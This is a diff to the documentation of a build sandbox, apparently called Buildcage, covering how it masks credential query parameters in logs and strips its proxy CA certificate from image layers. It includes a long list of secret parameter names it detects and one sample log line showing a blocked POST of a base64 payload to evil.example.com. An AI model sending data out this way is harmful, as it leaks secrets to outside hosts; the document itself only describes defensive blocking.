@@ -15,6 +15,7 @@ and links here for the details.
 - [Blocked service names](#blocked-service-names)
 - [Requests that never arrived whole](#requests-that-never-arrived-whole)
 - [Connections that failed](#connections-that-failed)
+- [Hidden query parameters](#hidden-query-parameters)
 - [Traffic artifact](#traffic-artifact)
 - [CA trust variables](#ca-trust-variables)
 
@@ -693,6 +694,29 @@ build reaching for something that is up.
 A blocked `DNS` row for the same name means something else entirely: that one is Buildcage's own
 resolver saying no rule allows the name, and it does fail the step.
 
+## Hidden query parameters
+
+**Communication details** and the job log replace the value of a query parameter named
+`access_key`, `access_token`, `api_key`, `api_token`, `auth`, `authorization`, `auth_token`,
+`client_secret`, `code`, `credential`, `credentials`, `id_token`, `jwt`, `key`, `passwd`,
+`password`, `pat`, `private_token`, `pwd`, `refresh_token`, `secret`, `session`, `session_token`,
+`sig`, `signature`, `subscription-key`, `token`, `x-amz-security-token`, `x-amz-signature`,
+`x-api-key` or `x-goog-signature`. The name is matched ignoring case, `-`, `_`, `.` and any trailing
+`[...]`, so `api_key`, `api-key`, `api.key`, `apiKey`, `APIKEY` and `api_key[0][]` are one name.
+What the brackets hold is not looked at, so `user[password]` keeps its value. A parameter starts
+after `&`, `;` or any `?`, so one in a URL carried inside another's value is replaced too. The
+replaced value runs to the next `&`, so a `;` or `?` inside a secret does not leave the rest of it
+showing:
+
+```
+✅ 00:04.212: GET https://cdn.example.com/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600 -> 200 (4.1MB)
+🚫 00:05.003: POST https://evil.example.com/?d=BASE64PAYLOAD -> not-allowed
+```
+
+The [traffic artifact](#traffic-artifact) keeps every value as it was sent.
+[Credentials in a URL](./security.md#credentials-in-a-url) explains why the summary hides these
+and what it still shows.
+
 ## Traffic artifact
 
 `upload_traffic_artifact: true` uploads the report's timeline as a `traffic.json` inside an artifact
@@ -823,17 +847,36 @@ reach, and what a step can't do to its CA store while it is mounted.
 
 ### CA residue
 
+Before a step's layer is committed, the wrapper reads the layer back, whatever the step exited
+with, and takes the CA certificate, and the anchor, out of:
+
+- every text file carrying it as PEM
+- every JKS or PKCS#12 trust store carrying it. A PKCS#12 one is opened with no password or
+  `changeit` and resealed in its own format, so an older JDK that wrote it can still read it.
+- each bare DER file a trust store splits the bundle into (Mono's `cert-sync` writes one per
+  certificate)
+- the EFI signature database RHEL's `update-ca-trust` writes
+
 Two things fail the build by default, pointing at `fail_on_ca_residue`:
 
-- a copy of the CA the wrapper finds in the step's layer but cannot take out, such as one inside a
-  binary, an uncompressed archive, a re-wrapped PEM or a JKS keystore sealed with a password other
-  than `changeit` (see [Limitations](../README.md#limitations))
+- a copy of the CA the wrapper finds in the step's layer but cannot take out: one in a JKS keystore
+  sealed with a password other than `changeit` or in a key's own chain, one inside any other binary
+  or an uncompressed archive, the PEM re-wrapped (escaped into JSON, indented in YAML, on one line
+  or in lines of 48 characters or more), a certificate the proxy issued (saved from a server
+  trust-on-first-use), or a PKCS#12 trust store holding such a certificate that opens with no
+  password or `changeit` (see [Limitations](../README.md#limitations))
 - a `pkcs11.txt` in the step's layer that still names the CA's slot, or is too large to read (see
   [CA trust variables](#ca-trust-variables))
 
 With `fail_on_ca_residue: false` both only warn, and the copy or the slot stays in the image. Whatever
 the setting, a step whose layer the wrapper cannot read back does not run, and an error reading the
 layer back or restoring it fails the build.
+
+A copy the wrapper cannot read is never found, so it stays in the image whatever the setting: one in
+a compressed archive, hex-dumped, re-wrapped outside a PEM block in shorter lines, in a keystore
+encrypted under another password, or in a PKCS#12 naming more than a million key-derivation
+iterations. These are not failed on, since dependencies ship encrypted test keystores and failing
+on them would break builds that never touched the CA.
 
 The CA is valid for two days and unique to the run, so a copy left in an image trusts only a proxy
 that no longer exists. It still shows the image was built behind Buildcage.
